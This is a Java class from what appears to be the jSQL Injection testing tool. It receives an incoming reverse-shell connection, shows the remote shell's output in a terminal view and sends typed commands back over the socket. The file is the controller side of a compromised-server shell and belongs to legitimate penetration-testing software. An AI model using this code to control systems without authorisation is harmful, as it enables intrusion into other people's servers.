package com.jsql.view.swing.terminal;

import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.net.Socket;

public class ServerInputConnection {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();

    private final BufferedReader bufferedReader;
    private final Socket clientSocket;
    private final ServerInput server;
    private final ExploitReverseShell exploitReverseShell;
    private boolean running = true;
    private String command;

    public ServerInputConnection(ExploitReverseShell exploitReverseShell, Socket clientSocket, ServerInput server) throws IOException {
        this.clientSocket = clientSocket;
        this.exploitReverseShell = exploitReverseShell;
        this.server = server;
        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Reverse established by " + clientSocket);
        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Type 'exit' in reverse shell to close the connection");
        this.bufferedReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
    }

    public void run() throws IOException, InterruptedException {
        DataOutputStream osa = new DataOutputStream(this.clientSocket.getOutputStream());

        new Thread(() -> {
            while (true) {
                int length = 1024;
                char[] chars = new char[length];
                int charsRead;
                try {
                    charsRead = this.bufferedReader.read(chars, 0, length);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                String result;
                if (charsRead != -1) {
                    result = new String(chars, 0, charsRead);  // discard unused chars from buffer
                    this.exploitReverseShell.append(result.matches("\\$$") ? result +" " : result);  // space after internal prompt
                    this.exploitReverseShell.reset(false);
                } else {
                    this.running = false;
                    try {
                        this.server.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Reverse connection closed");
                    break;
                }
            }
        }).start();

        while (this.running) {
            if (StringUtils.isNotEmpty(this.command)) {
                var cmd = this.command.replaceAll("[^$]*\\$\\s*", "");
                this.command = null;
                osa.writeBytes(cmd + "\n");
            }
        }
    }

    public void setCommand(String command) {
        this.command = command;
    }
}